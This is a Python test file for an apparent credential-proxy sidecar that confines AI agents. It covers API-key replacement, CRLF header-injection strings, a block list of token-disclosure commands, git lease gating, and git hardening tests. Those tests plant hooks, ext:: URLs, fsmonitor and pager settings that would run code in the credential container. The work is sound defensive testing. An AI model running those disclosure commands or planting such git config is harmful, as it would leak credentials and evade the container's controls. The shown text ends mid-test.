import argparse
import base64
import contextlib
import http.client
import io
import json
import logging
import os
from dataclasses import replace
import queue
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import types
import unittest
import urllib.error
import urllib.request
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from unittest import mock

import credential_proxy
import credential_proxy_client
import gke_endpoint
import providers
import vcs_broker
from credential_proxy import (
    MAX_REPOSITORY_LENGTH,
    AgentAPIProxyHandler,
    CommandExecutor,
    CredentialProxyHandler,
    GoogleChatRelay,
    Policy,
    SlackRelay,
    _chat_error_fields,
    _git_plan,
    _slack_error_detail,
    _slack_error_fields,
    git_argument_violation,
    is_valid_repository,
    parse_gke_context,
    read_current_context,
)
from slack_relay_patch import read_upload

# How long to let a close (or a reset) reach the client before reading the
# response, in seconds. Loopback needs no more than a few milliseconds; this is
# padded for a loaded CI runner, and it is only ever waited out once.
_RESET_SETTLE_SECONDS = 0.5

# A request body that cannot sit entirely in the kernel's socket buffers, and so
# is still being written when a handler that does not read it closes. Below that
# threshold the write completes, the close is orderly, and the response arrives
# whether or not the body was drained -- measured on loopback, 1 MiB passes
# either way and 4 MiB does not. 8 MiB leaves room for a runner tuned higher
# while staying under AgentAPIProxyHandler.max_request_bytes, above which the
# handler refuses the request instead of reading it.
_BODY_LARGER_THAN_SOCKET_BUFFERS = 8 * 1024 * 1024

# A drain deadline short enough to expire inside a test. The handler reads this
# from the module at call time, so patching it reaches the same timeout branch a
# stalled client hits in production without waiting out the shipped ten seconds.
_SHORT_DRAIN_TIMEOUT_SECONDS = 0.25

# How long to wait for the 401 that the drain's deadline releases. Comfortably
# over _SHORT_DRAIN_TIMEOUT_SECONDS and under the shipped deadline, so a handler
# that ignored the patch runs out of read budget here instead of passing.
_STALLED_CLIENT_READ_TIMEOUT_SECONDS = 5

# A body announced in Content-Length but never sent in full. Large enough that
# the handler is still waiting on it when the client stops, small enough to stay
# under AgentAPIProxyHandler.max_request_bytes so the drain runs at all.
_ANNOUNCED_BODY_NEVER_SENT = 1024 * 1024

# Decimal places the fake clock keeps; enough for any poll interval the kill
# uses, few enough that repeated sums stay exact.
_FAKE_CLOCK_DECIMALS = 9


class _FakeClock:
    """A `time` stand-in for the kill's waits: `sleep` advances `monotonic`.

    `ceiling` is fake seconds; a `sleep` that would carry the clock past it
    raises instead, so a wait that stopped honouring its bound fails the test
    with a line naming the cause rather than looping until the runner's own
    timeout ends the job.
    """

    def __init__(self, ceiling):
        self.now = 0.0
        self.ceiling = ceiling

    def monotonic(self):
        return self.now

    def sleep(self, seconds):
        if self.now + seconds > self.ceiling:
            raise AssertionError(
                f"still waiting at fake t={self.now:.2f}s, past the "
                f"{self.ceiling}s ceiling: a wait no longer honours its bound"
            )
        # Rounded so that the polls sum to the bound exactly: forty 0.05s
        # sleeps in binary floating point land a hair past 2.0, and the
        # deadline computed from there would then buy one poll more or fewer
        # than the arithmetic says.
        self.now = round(self.now + seconds, _FAKE_CLOCK_DECIMALS)


class AgentAPIProxyTest(unittest.TestCase):
    def setUp(self):
        self.received_authorization = ""
        owner = self

        class UpstreamHandler(BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                owner.received_authorization = self.headers.get("Authorization", "")
                body = b"proxied"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, _message, *_args):
                return

        self.upstream = ThreadingHTTPServer(("127.0.0.1", 0), UpstreamHandler)
        AgentAPIProxyHandler.external_key = "external-secret"
        AgentAPIProxyHandler.upstream_key = "internal-sentinel"
        AgentAPIProxyHandler.upstream_port = self.upstream.server_port
        self.proxy = ThreadingHTTPServer(("127.0.0.1", 0), AgentAPIProxyHandler)
        for server in (self.upstream, self.proxy):
            threading.Thread(target=server.serve_forever, daemon=True).start()

    def tearDown(self):
        self.proxy.shutdown()
        self.upstream.shutdown()
        self.proxy.server_close()
        self.upstream.server_close()

    def test_replaces_external_api_key_before_forwarding(self):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.proxy.server_port}/health",
            headers={"Authorization": "Bearer external-secret"},
        )
        with urllib.request.urlopen(request) as response:
            self.assertEqual(b"proxied", response.read())
        self.assertEqual("Bearer internal-sentinel", self.received_authorization)

    def test_rejects_invalid_external_api_key(self):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.proxy.server_port}/health",
            headers={"Authorization": "Bearer wrong"},
        )
        with self.assertRaises(urllib.error.HTTPError) as raised:
            urllib.request.urlopen(request)
        self.assertEqual(401, raised.exception.code)
        self.assertEqual("", self.received_authorization)

    def test_rejection_reaches_a_client_that_sent_a_body(self):
        # Raw socket rather than urllib: the defect is at the transport, and a
        # library that retries or re-raises would hide which of the two happened.
        body = b"x" * _BODY_LARGER_THAN_SOCKET_BUFFERS
        request = (
            b"POST /v1/responses HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Authorization: Bearer wrong\r\n"
            b"Content-Type: application/json\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
        )
        received = b""
        with socket.create_connection(
            ("127.0.0.1", self.proxy.server_port), timeout=10
        ) as client:
            try:
                client.sendall(request)
                # Read after the close has landed rather than into the race, so a
                # client quick enough off the mark cannot read the 401 out of the
                # buffer before a reset would have discarded it.
                time.sleep(_RESET_SETTLE_SECONDS)
                while chunk := client.recv(65536):
                    received += chunk
            except OSError as exc:
                self.fail(
                    "the proxy abandoned the connection instead of delivering its 401, "
                    f"which reads to a caller as a dead listener: {exc}"
                )
        self.assertIn(b"401", received.split(b"\r\n", 1)[0])
        self.assertEqual("", self.received_authorization)

    def _read_status_line(self, client):
        """Return the proxy's status line, failing the test if it never sends one."""
        received = b""
        try:
            while b"\r\n" not in received:
                chunk = client.recv(65536)
                if not chunk:
                    break
                received += chunk
        except OSError as exc:
            self.fail(
                "the proxy abandoned the connection instead of responding, which "
                f"reads to a caller as a dead listener: {exc}"
            )
        return received.split(b"\r\n", 1)[0]

    def test_rejection_reaches_a_client_whose_body_cannot_be_framed(self):
        # An unparseable Content-Length is one of the two shapes the drain
        # declines. It still has to answer: the caller learns its key is wrong
        # rather than that something ate the connection.
        request = (
            b"POST /v1/responses HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Authorization: Bearer wrong\r\n"
            b"Content-Length: not-a-number\r\n\r\n"
        )
        with socket.create_connection(
            ("127.0.0.1", self.proxy.server_port), timeout=10
        ) as client:
            client.sendall(request)
            time.sleep(_RESET_SETTLE_SECONDS)
            status = self._read_status_line(client)
        self.assertIn(b"401", status)
        self.assertEqual("", self.received_authorization)

    def test_rejection_reaches_a_client_that_sent_a_chunked_body(self):
        # The other declined shape. The handler cannot know how much to read
        # without decoding the chunking, so it does not try.
        request = (
            b"POST /v1/responses HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Authorization: Bearer wrong\r\n"
            b"Transfer-Encoding: chunked\r\n\r\n"
            b"4\r\nbody\r\n0\r\n\r\n"
        )
        with socket.create_connection(
            ("127.0.0.1", self.proxy.server_port), timeout=10
        ) as client:
            client.sendall(request)
            time.sleep(_RESET_SETTLE_SECONDS)
            status = self._read_status_line(client)
        self.assertIn(b"401", status)
        self.assertEqual("", self.received_authorization)

    def test_rejection_reaches_a_client_that_closed_mid_body(self):
        # Announce a body, send a fraction of it, then half-close. The drain
        # reads to EOF and stops rather than blocking on bytes that will never
        # arrive.
        partial = b"x" * 1024
        request = (
            b"POST /v1/responses HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Authorization: Bearer wrong\r\n"
            b"Content-Length: " + str(_ANNOUNCED_BODY_NEVER_SENT).encode() + b"\r\n\r\n"
        ) + partial
        with socket.create_connection(
            ("127.0.0.1", self.proxy.server_port), timeout=10
        ) as client:
            client.sendall(request)
            client.shutdown(socket.SHUT_WR)
            status = self._read_status_line(client)
        self.assertIn(b"401", status)
        self.assertEqual("", self.received_authorization)

    def test_drain_deadline_releases_a_client_that_stalls_mid_body(self):
        # Same as above but without the close: the client announces a body,
        # sends a fraction, and then holds the connection open saying nothing.
        # Without the deadline the handler waits on it indefinitely, so this
        # asserts both that the refusal arrives and that it waited for the
        # deadline to deliver it.
        partial = b"x" * 1024
        request = (
            b"POST /v1/responses HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Authorization: Bearer wrong\r\n"
            b"Content-Length: " + str(_ANNOUNCED_BODY_NEVER_SENT).encode() + b"\r\n\r\n"
        ) + partial
        with mock.patch.object(
            credential_proxy,
            "AGENT_API_DRAIN_TIMEOUT_SECONDS",
            _SHORT_DRAIN_TIMEOUT_SECONDS,
        ):
            with socket.create_connection(
                ("127.0.0.1", self.proxy.server_port),
                timeout=_STALLED_CLIENT_READ_TIMEOUT_SECONDS,
            ) as client:
                # The clock starts before the request leaves, not after. The
                # server's drain window opens once it has read the partial body,
                # and that can happen before sendall returns to this thread: the
                # bytes reach the kernel inside sendall, and the server thread can
                # wake, parse, and block in its timed read first. A clock started
                # here precedes the bytes leaving this socket, so elapsed brackets
                # whatever window the server enforced. Started after sendall it
                # could sit inside that window, and a loaded runner read 0.2495
                # against the 0.25 deadline (#1740).
                started = time.monotonic()
                client.sendall(request)
                status = self._read_status_line(client)
                elapsed = time.monotonic() - started
        self.assertIn(b"401", status)
        self.assertGreaterEqual(elapsed, _SHORT_DRAIN_TIMEOUT_SECONDS)
        self.assertEqual("", self.received_authorization)

    def test_sanitizes_crlf_in_forwarded_headers(self):
        dirty = "value\r\nX-Injected: evil"
        self.assertEqual(
            "valueX-Injected: evil",
            AgentAPIProxyHandler._sanitize_header(dirty),
        )
        self.assertEqual("clean", AgentAPIProxyHandler._sanitize_header("clean"))

    def test_proxy_strips_crlf_from_forwarded_response_headers(self):
        body = b"proxied"

        class FakeResponse:
            status = 200
            reason = "OK\r\nX-Status-Injected: evil"

            def __init__(self):
                self._pending = body

            def getheaders(self):
                return [
                    ("Content-Length", str(len(body))),
                    ("X-Test", "value\r\nX-Injected: evil"),
                ]

            def read(self, _amount=-1):
                chunk, self._pending = self._pending, b""
                return chunk

        class FakeConnection:
            def __init__(self, *_args, **_kwargs):
                pass

            def request(self, *_args, **_kwargs):
                pass

            def getresponse(self):
                return FakeResponse()

            def close(self):
                pass

# Patching http.client.HTTPConnection is global, so read the raw response
        # over a socket instead of urllib (which would use the fake too).
        with mock.patch(
            "credential_proxy.http.client.HTTPConnection", FakeConnection
        ):
            with socket.create_connection(
                ("127.0.0.1", self.proxy.server_port), timeout=10
            ) as sock:
                sock.sendall(
                    b"GET /health HTTP/1.1\r\n"
                    b"Host: 127.0.0.1\r\n"
                    b"Authorization: Bearer external-secret\r\n"
                    b"Connection: close\r\n\r\n"
                )
                raw = b""
                while chunk := sock.recv(4096):
                    raw += chunk

        self.assertTrue(raw.endswith(body))
        # The CRLF-carrying value is folded onto a single header line...
        self.assertIn(b"X-Test: valueX-Injected: evil\r\n", raw)
        # ...so nothing injected appears as its own header or in the status line.
        self.assertNotIn(b"\r\nX-Injected:", raw)
        self.assertNotIn(b"\r\nX-Status-Injected:", raw)


class PolicyTest(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.policy_path = Path(self.temp_dir.name) / "policy.json"
        self.policy_path.write_text(
            json.dumps(
                {
                    "blockedMessage": "Command blocked for security reasons.",
                    "rules": [
                        {
                            "id": "gcp.access-token-disclosure",
                            "pattern": r"\bgcloud\b(?:\s+\S+)*?\s+auth\b(?:\s+\S+)*?\s+print-(?:access|identity)-token\b",
                        },
                        {
                            "id": "github.token-disclosure",
                            "pattern": r"\bgh\b(?:\s+\S+)*?\s+auth\b(?:\s+\S+)*?\s+token\b",
                        },
                        {
                            "id": "kubernetes.token-disclosure",
                            "pattern": r"\bkubectl\b(?:\s+\S+)*?\s+config\b(?:\s+\S+)*?\s+view\b(?:\s+\S+)*?\s+--raw\b",
                        },
                    ],
                }
            ),
            encoding="utf-8",
        )
        self.policy = Policy.load(str(self.policy_path))

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_blocks_configured_command(self):
        rule = self.policy.blocked_by(["gcloud", "auth", "print-access-token"])
        self.assertIsNotNone(rule)
        self.assertEqual("gcp.access-token-disclosure", rule.rule_id)

    def test_blocks_disclosure_commands_with_global_flags(self):
        cases = (
            (["gcloud", "--quiet", "auth", "print-access-token"], "gcp.access-token-disclosure"),
            (["gcloud", "--project", "example", "auth", "--quiet", "print-identity-token"], "gcp.access-token-disclosure"),
            (["gh", "--help", "auth", "token"], "github.token-disclosure"),
            (["kubectl", "--namespace=default", "config", "view", "--raw"], "kubernetes.token-disclosure"),
        )
        for argv, rule_id in cases:
            with self.subTest(argv=argv):
                rule = self.policy.blocked_by(argv)
                self.assertIsNotNone(rule)
                self.assertEqual(rule_id, rule.rule_id)

    def test_allows_supported_command(self):
        self.assertIsNone(self.policy.blocked_by(["kubectl", "get", "pods"]))


class GitLeaseGateTest(unittest.TestCase):
    """The floor under the shared PersistentVolumeClaim.

    Containment to the workspace keeps agents off the sidecar's filesystem; it
    says nothing about keeping them off each other. `submit-suggestion` ran
    `checkout -b` and `push -f` inside a clone a fleet audit was midway through,
    because the clone was a single directory every agent shared. Skills now take
    a lease and get a private tree under it, and this is what stops a skill that
    does not from mutating one anyway.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)

    def executor(self, **environment):
        with mock.patch.dict(os.environ, environment):
            return CommandExecutor(
                timeout_seconds=5,
                max_output_bytes=1024,
                state_dir=self.temp_dir.name,
                scoped_pool=None,
            )

    def leased(self, executor, lease="compliance-audit", repo="acme__fleet"):
        """A workspace laid out the way `gitops_workspace` lays one out."""
        holder = executor.workspace_dir / "gitops" / lease
        workspace = holder / repo
        workspace.mkdir(parents=True, exist_ok=True)
        (holder / ".lease").write_text(
            json.dumps({"lease": lease, "owner": "fleet-audit"}), encoding="utf-8"
        )
        return workspace

    def test_a_mutating_verb_inside_a_lease_is_allowed(self):
        executor = self.executor()
        workspace = self.leased(executor)
        for argv in (
            ["git", "commit", "-m", "remediate netpol"],
            ["git", "add", "clusters/prod/netpol.yaml"],
            ["git", "checkout", "-B", "fleet-audit/compliance", "origin/main"],
            ["git", "push", "--force-with-lease", "origin", "fleet-audit/compliance"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(executor.git_lease_violation(argv, str(workspace)))

    def test_the_verbs_that_write_a_tree_without_saying_so_are_refused(self):
        # Each of these is a working-tree write under another name: `pull` is
        # `fetch` plus a merge or a rebase, `submodule update` checks out whole
        # directories, `sparse-checkout set` adds and removes files across the
        # entire tree. All three used to be reachable in a clone another agent
        # was midway through, because the denylist only named the obvious verbs.
        executor = self.executor()
        self.leased(executor)
        unleased = str(executor.workspace_dir)
        for argv in (
            ["git", "pull", "--rebase", "origin", "main"],
            ["git", "submodule", "update", "--init", "--recursive"],
            ["git", "sparse-checkout", "set", "clusters/prod"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(executor.git_lease_violation(argv, unleased))

    def test_a_subdirectory_of_the_lease_is_still_inside_it(self):
        # The agent `cd`s into the manifests it is editing.
        executor = self.executor()
        workspace = self.leased(executor)
        nested = workspace / "clusters" / "prod"
        nested.mkdir(parents=True)
        self.assertIsNone(
            executor.git_lease_violation(["git", "commit", "-m", "x"], str(nested))
        )

    def test_a_mutating_verb_outside_every_lease_is_refused(self):
        # The incident, reduced: an agent that skipped the workspace step and
        # ran git wherever its shell happened to be.
        executor = self.executor()
        self.leased(executor)
        violation = executor.git_lease_violation(
            ["git", "commit", "--allow-empty", "-m", "x"], str(executor.workspace_dir)
        )
        self.assertIsNotNone(violation)
        self.assertIn(".lease", violation)
        self.assertIn("submit_suggestion.py prepare", violation)

    def test_the_legacy_shared_clone_is_no_longer_writable(self):
        # `/opt/data/gitops/<owner>__<name>` — the flat directory every agent
        # used to share. It survives an upgrade on disk; it must not survive as
        # a place to commit.
        executor = self.executor()
        legacy = executor.workspace_dir / "gitops" / "acme__fleet"
        (legacy / ".git").mkdir(parents=True)
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "commit", "-m", "x"], str(legacy))
        )

    def test_read_verbs_are_untouched(self):
        # A denylist, not a read-only allowlist: an unfamiliar read verb failing
        # closed would be a worse outcome than the race this closes.
        executor = self.executor()
        unleased = str(executor.workspace_dir)
        for argv in (
            ["git", "status"],
            ["git", "diff", "--stat"],
            ["git", "log", "-1"],
            ["git", "show", "HEAD"],
            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
            ["git", "config", "user.name", "platform-agent"],
            ["git", "ls-files"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(executor.git_lease_violation(argv, unleased))

    def test_clone_and_fetch_need_the_lease_the_same_as_the_rest(self):
        # Neither writes a tree it owns, which is why both were left out at
        # first. `fetch` moves `origin/*` in whatever clone it runs in, and
        # every lease-holder here compares against those refs to decide whether
        # its work raced someone else's -- a foreign fetch makes that
        # comparison agree while the answer is wrong. `clone` writes into a
        # destination it does not choose, which can sit inside another lease.
        executor = self.executor()
        unleased = str(executor.workspace_dir)
        clone = ["git", "clone", "--quiet", "https://github.com/acme/fleet", "x"]
        fetch = ["git", "fetch", "--prune", "origin"]
        for argv in (clone, fetch):
            with self.subTest(argv=argv):
                self.assertIsNotNone(executor.git_lease_violation(argv, unleased))

        # Paired ordinary use: `ensure_workspace` writes the marker before it
        # clones, at the lease root the clone runs in, so the callers that
        # legitimately issue these are unaffected.
        holder = executor.workspace_dir / "gitops" / "t_card"
        holder.mkdir(parents=True)
        (holder / ".lease").write_text("{}", encoding="utf-8")
        for argv in (clone, fetch):
            with self.subTest(argv=argv, leased=True):
                self.assertIsNone(executor.git_lease_violation(argv, str(holder)))

    def test_a_dash_c_redirect_out_of_the_lease_is_refused(self):
        # git applies `-C` before running the subcommand, so a check that only
        # read `cwd` would be checking a directory the command never touches.
        executor = self.executor()
        workspace = self.leased(executor)
        escape = executor.workspace_dir / "profiles"
        escape.mkdir(parents=True, exist_ok=True)
        for argv in (
            ["git", "-C", "../../profiles", "commit", "-m", "x"],
            ["git", "-C", str(escape), "checkout", "main"],
            ["git", "-C=../..", "reset", "--hard"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNotNone(
                    executor.git_lease_violation(argv, str(workspace))
                )

    def test_a_dash_c_redirect_into_a_lease_is_allowed(self):
        executor = self.executor()
        workspace = self.leased(executor)
        self.assertIsNone(
            executor.git_lease_violation(
                ["git", "-C", str(workspace), "commit", "-m", "x"],
                str(executor.workspace_dir),
            )
        )

    def test_a_global_flag_does_not_hide_the_subcommand(self):
        # `audit_report.py` issues `git --literal-pathspecs add …`.
        executor = self.executor()
        self.assertIsNotNone(
            executor.git_lease_violation(
                ["git", "--literal-pathspecs", "add", "manifest.yaml"],
                str(executor.workspace_dir),
            )
        )

    def test_a_flag_value_is_not_mistaken_for_a_verb(self):
        # `-c` consumes the next argument; reading it as the subcommand would
        # make the gate skip a real `commit`.
        executor = self.executor()
        self.assertIsNotNone(
            executor.git_lease_violation(
                ["git", "-c", "commit.gpgsign=false", "commit", "-m", "x"],
                str(executor.workspace_dir),
            )
        )

    def test_a_directory_outside_the_workspace_says_so(self):
        executor = self.executor()
        violation = executor.git_lease_violation(["git", "commit", "-m", "x"], "/etc")
        self.assertIn("outside the shared workspace", violation)

    def test_no_working_directory_at_all_is_refused(self):
        # The pre-lease `submit_suggestion.py` sent none, and the sidecar's
        # default is the workspace root, which holds no lease.
        executor = self.executor()
        self.assertIsNotNone(
            executor.git_lease_violation(["git", "push", "-f", "origin", "x"], None)
        )

    def test_other_executables_are_not_this_gates_business(self):
        executor = self.executor()
        for argv in (
            ["gh", "pr", "create", "--title", "t"],
            ["kubectl", "apply", "-f", "manifest.yaml"],
            ["gcloud", "container", "clusters", "list"],
        ):
            with self.subTest(argv=argv):
                self.assertIsNone(
                    executor.git_lease_violation(argv, str(executor.workspace_dir))
                )

    def test_the_gate_can_be_switched_off(self):
        # The rollback an operator reaches for when a skill that has not been
        # migrated needs to keep working without a new image.
        for value in ("0", "false", "no", "off", "OFF"):
            with self.subTest(value=value):
                executor = self.executor(CREDENTIAL_PROXY_REQUIRE_GIT_LEASE=value)
                self.assertIsNone(
                    executor.git_lease_violation(
                        ["git", "commit", "-m", "x"], str(executor.workspace_dir)
                    )
                )

    def test_the_gate_is_on_by_default(self):
        with mock.patch.dict(os.environ, {}, clear=False):
            os.environ.pop("CREDENTIAL_PROXY_REQUIRE_GIT_LEASE", None)
            self.assertTrue(self.executor().require_git_lease)

    def test_the_marker_name_matches_the_one_gitops_workspace_writes(self):
        # Two constants in two modules that must not drift: renaming one alone
        # locks every skill out of git.
        import gitops_workspace

        self.assertEqual(credential_proxy.GIT_LEASE_MARKER, gitops_workspace.LEASE_FILENAME)


class GitHardeningTest(unittest.TestCase):
    """git's own configuration, as a way into the container holding the creds.

    Every test here drives *real git* and asserts what it did, never that a
    variable is set. Asserting the variable would restate the code: the
    question is whether git obeys it, and the only three things that answer
    that are git, the attack, and a control.

    Each hardening variable has at least one test here that turns red when the
    variable is deleted from `CommandExecutor.environment`, checked by removing
    each in turn and running the suite. Note that is a property of the *set*,
    not of every test: `test_the_protocol_allowlist_refuses_nothing_it_should_allow`
    guards the value rather than the variable and stays green if the variable
    is deleted outright, which is what its sibling above it is for.
    """

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.marker = Path(self.temp_dir.name) / "EXECUTED"
        self.payload = Path(self.temp_dir.name) / "payload.sh"
        self.payload.write_text(
            f"#!/bin/sh\ntouch {self.marker}\n", encoding="utf-8"
        )
        self.payload.chmod(0o755)

    def executor(self, max_output_bytes=1 << 16):
        return CommandExecutor(
            timeout_seconds=30,
            max_output_bytes=max_output_bytes,
            state_dir=str(Path(self.temp_dir.name) / "state"),
        )

    def executed(self):
        """Did the payload run? Consumes the marker so cases cannot bleed."""
        hit = self.marker.exists()
        self.marker.unlink(missing_ok=True)
        return hit

    def repository(self, executor, name="repo"):
        """A git repository where the agent has one: inside the workspace."""
        path = executor.workspace_dir / name
        path.mkdir(parents=True, exist_ok=True)
        subprocess.run(
            ["git", "init", "--quiet"], cwd=path, check=True, capture_output=True
        )
        return path

    def append_repository_config(self, repository, text):
        """Write to `.git/config` — a file the agent shares a group with."""
        config = repository / ".git" / "config"
        config.write_text(config.read_text(encoding="utf-8") + text, encoding="utf-8")

    def test_the_ext_transport_cannot_execute_a_command(self):
        # The finding. `ext::` hands the rest of the URL to a shell, and
        # `-c protocol.ext.allow=always` is the agent turning it on. This runs
        # through `execute`, which is *below* the argv refusal in the handler,
        # so what it demonstrates is that the environment stops it on its own.
        # That layering is deliberate: the parser must not be the boundary.
        executor = self.executor()
        result = executor.execute(
            [
                "git",
                "-c",
                "protocol.ext.allow=always",
                "clone",
                f"ext::{self.payload}",
                str(executor.workspace_dir / "cloned"),
            ],
            cwd=str(executor.workspace_dir),
        )
        self.assertFalse(
            self.executed(),
            "ext:: executed a command inside the credential container",
        )
        self.assertNotEqual(0, result.exit_code)
        self.assertIn("not allowed", result.stderr)

    def test_the_protocol_allowlist_refuses_nothing_it_should_allow(self):
        # GIT_ALLOW_PROTOCOL is a colon-separated list, and the empty string is
        # a list of one empty protocol name — it allows *nothing*, so setting it
        # wrong bricks every clone rather than quietly permitting them. This is
        # the test that dies if someone empties the value: the clone below fails
        # either way (there is no network here), but only an empty allowlist
        # makes it fail with "transport 'https' not allowed".
        executor = self.executor()
        result = executor.execute(
            [
                "git",
                "clone",
                "https://github.invalid/acme/fleet.git",
                str(executor.workspace_dir / "https-clone"),
            ],
            cwd=str(executor.workspace_dir),
        )
        self.assertNotIn("transport 'https' not allowed", result.stderr)

    def test_a_hook_in_the_repository_does_not_run(self):
        # Reachable with no unusual argv at all: write the file, wait for any
        # skill to commit. `git commit` appears nine times across the skills.
        executor = self.executor()
        repository = self.repository(executor)
        hook = repository / ".git" / "hooks" / "pre-commit"
        hook.write_text(f"#!/bin/sh\ntouch {self.marker}\n", encoding="utf-8")
        hook.chmod(0o755)
        result = executor.execute(
            ["git", "commit", "--allow-empty", "-m", "audit"], cwd=str(repository)
        )
        self.assertFalse(self.executed(), ".git/hooks/pre-commit ran")
        self.assertEqual(0, result.exit_code, result.stderr)

    def test_a_hooks_path_in_the_repository_config_is_overridden(self):
        # The same attack one layer up, and the reason the pin has to be in the
        # environment rather than written into a config file: the forced-config
        # layer outranks `.git/config`, a file on the shared volume.
        executor = self.executor()
        repository = self.repository(executor)
        hooks = Path(self.temp_dir.name) / "agent-hooks"
        hooks.mkdir()
        (hooks / "pre-commit").write_text(
            f"#!/bin/sh\ntouch {self.marker}\n", encoding="utf-8"
        )
        (hooks / "pre-commit").chmod(0o755)
        self.append_repository_config(repository, f"\n[core]\n\thooksPath = {hooks}\n")
        result = executor.execute(
            ["git", "commit", "--allow-empty", "-m", "audit"], cwd=str(repository)
        )
        self.assertFalse(self.executed(), "repository core.hooksPath ran a hook")
        self.assertEqual(0, result.exit_code, result.stderr)

    def test_the_hooks_directory_is_empty_and_not_writable(self):
        # `core.hooksPath` only disables hooks because there is nothing in the
        # directory it names and nothing can be put there. Both halves are the
        # control, so both are asserted.
        executor = self.executor()
        self.assertEqual([], list(executor.git_hooks_dir.iterdir()))
        self.assertEqual(0o500, executor.git_hooks_dir.stat().st_mode & 0o777)

    def test_a_system_config_is_ignored(self):
        # GIT_CONFIG_NOSYSTEM. /etc/gitconfig is not writable from a test, so
        # the system file is relocated with GIT_CONFIG_SYSTEM — which
        # GIT_CONFIG_NOSYSTEM also suppresses, and which is exactly the claim:
        # no system-scope file is read, wherever it is.
        executor = self.executor()
        system = Path(self.temp_dir.name) / "system-gitconfig"
        system.write_text("[kubeagents]\n\tprobe = system\n", encoding="utf-8")
        executor.environment["GIT_CONFIG_SYSTEM"] = str(system)
        result = executor.execute(
            ["git", "config", "--get", "kubeagents.probe"],
            cwd=str(executor.workspace_dir),
        )
        self.assertEqual("", result.stdout.strip())
        self.assertEqual(1, result.exit_code)

    def test_the_global_config_is_pinned_and_survives_a_moved_home(self):
        # GIT_CONFIG_GLOBAL. The global file is out of the agent's reach today
        # only because HOME is the sidecar-only state dir — deployment
        # geometry, not a control. Naming the path keeps the property when the
        # geometry moves, which is what this asserts: HOME is repointed at a
        # directory holding a hostile .gitconfig and git must not read it.
        executor = self.executor()
        executor.git_config_global.write_text(
            "[kubeagents]\n\tprobe = pinned\n", encoding="utf-8"
        )
        elsewhere = Path(self.temp_dir.name) / "moved-home"
        elsewhere.mkdir()
        (elsewhere / ".gitconfig").write_text(
            "[kubeagents]\n\tprobe = agent-controlled\n", encoding="utf-8"
        )
        executor.environment["HOME"] = str(elsewhere)
        result = executor.execute(
            ["git", "config", "--get", "kubeagents.probe"],
            cwd=str(executor.workspace_dir),
        )
        self.assertEqual("pinned", result.stdout.strip())

    def test_the_global_config_is_still_writable(self):
        # The reason GIT_CONFIG_GLOBAL is not /dev/null. `gh auth setup-git`
        # installs the GitHub credential helper by running `git config
        # --global credential.helper …` in this same environment, so a global
        # config that cannot be written is authenticated push and fetch gone.
        # Hardening that breaks the product gets reverted, and then nothing is
        # hardened.
        executor = self.executor()
        written = executor.execute(
            ["git", "config", "--global", "credential.helper", "!gh auth git-credential"],
            cwd=str(executor.workspace_dir),
        )
        self.assertEqual(0, written.exit_code, written.stderr)
        read_back = executor.execute(
            ["git", "config", "--get", "credential.helper"],
            cwd=str(executor.workspace_dir),
        )
        self.assertEqual("!gh auth git-credential", read_back.stdout.strip())

    def test_an_fsmonitor_in_the_repository_config_does_not_run(self):
        # core.fsmonitor is run by `git status` — a *read* verb, so the lease
        # gate never sees it.
        executor = self.executor()
        repository = self.repository(executor)
        self.append_repository_config(
            repository, f"\n[core]\n\tfsmonitor = {self.payload}\n"
        )
        executor.execute(["git", "status", "--porcelain"], cwd=str(repository))
        self.assertFalse(self.executed(), "core.fsmonitor ran")

    def test_a_pager_in_the_repository_config_does_not_run(self):
        # `core.pager` is NOT in GIT_FORCED_CONFIG and is not refused in argv.
        # What closes it is that `_execute` captures output through a pipe, so
        # git never sees a terminal on stdout and never starts a pager. That is
        # an implementation detail of the executor rather than a control, which
        # is exactly why it is pinned here.
        #
        # Measured against git 2.55 under the same pinned environment, varying
        # only the descriptor: with stdout on a pty, a repository-local
        # `core.pager` executes on `git log`, `git diff`, `git show` and
        # `git branch` — all read verbs, none of which takes a lease. With
        # stdout on a pipe none of them runs it, and `--paginate`/`-p` does not
        # change that.
        #
        # So if this test ever fails, the executor has started giving git a
        # terminal, and a repository-local config value the agent writes is
        # arbitrary code execution in the credential container again. The fix
        # then is not to pin `core.pager` — `pager.<cmd>` reaches the same place
        # with an arbitrary name in the key — it is to keep the pipe.
        executor = self.executor()
        repository = self.repository(executor)
        # The fixture has to carry a commit. `self.repository` only runs
        # `git init`, and `git log` in an empty repository exits 128 with
        # nothing to page -- so the log subTests below would pass on a pty too,
        # which is exactly the silent disarming this test exists to prevent.
        subprocess.run(
            ["git", "-c", "user.name=t", "-c", "user.email=t@t.invalid",
             "commit", "--quiet", "--allow-empty", "-m", "seed"],
            cwd=repository, check=True, capture_output=True,
        )
        self.append_repository_config(
            repository, f"\n[core]\n\tpager = {self.payload}\n"
        )
        for argv in (
            ["git", "log", "--oneline"],
            ["git", "branch"],
            ["git", "--paginate", "log", "--oneline"],
        ):
            with self.subTest(argv=argv):
                result = executor.execute(argv, cwd=str(repository))
                # Assert the command actually ran, so a future fixture change
                # cannot turn these into vacuous passes.
